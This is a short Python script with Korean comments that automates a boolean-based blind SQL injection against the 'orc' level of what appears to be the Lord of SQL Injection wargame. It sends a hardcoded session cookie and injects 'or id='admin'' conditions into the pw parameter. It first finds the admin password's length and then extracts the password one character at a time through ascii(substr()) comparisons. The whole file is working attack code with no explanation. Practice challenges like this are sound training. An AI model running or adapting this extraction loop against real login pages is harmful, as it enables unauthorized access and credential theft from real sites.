import http.client

headers={'Cookie':'PHPSESSID=pdrq9erdrfaks5stqsi3mfj1p1',
         'Content-Type':'application/x-www-form-urlencoded'}
#cookie 세팅
conn=http.client.HTTPSConnection("los.eagle-jump.org")
#los url 세팅

key="Hello admin"
#set key ward

query=''
result=""


print ("start")


for i in range(1,30):
    print("length : ", i)
    query = '/orc_47190a4d33f675a601f8def32df2583a.php'
    query += "?pw=1'or%20id='admin'%20and%20"
    query += "length(pw)="+str(i)+"%20--+"
    conn.request('GET',query,'',headers)
    data=conn.getresponse().read().decode("utf-8")
    if data.find(key) > 0:
        print ("key length :", i)
        length = i
        break



for i in range(1, i+1):
    for j in range(31, 128):
        print (i, j)
        query ='/orc_47190a4d33f675a601f8def32df2583a.php'
        query +="?pw=1'or%20id='admin'%20and%20"
        query += "ascii(substr(pw,"+str(i)+",1))="+str(j)+"--+"
        conn.request('GET',query,'',headers)
        data=conn.getresponse().read().decode("utf-8")
        
        if data.find(key) > 0:
            print ("key find :", chr(j))
            result+=chr(j)
            break
print (result)
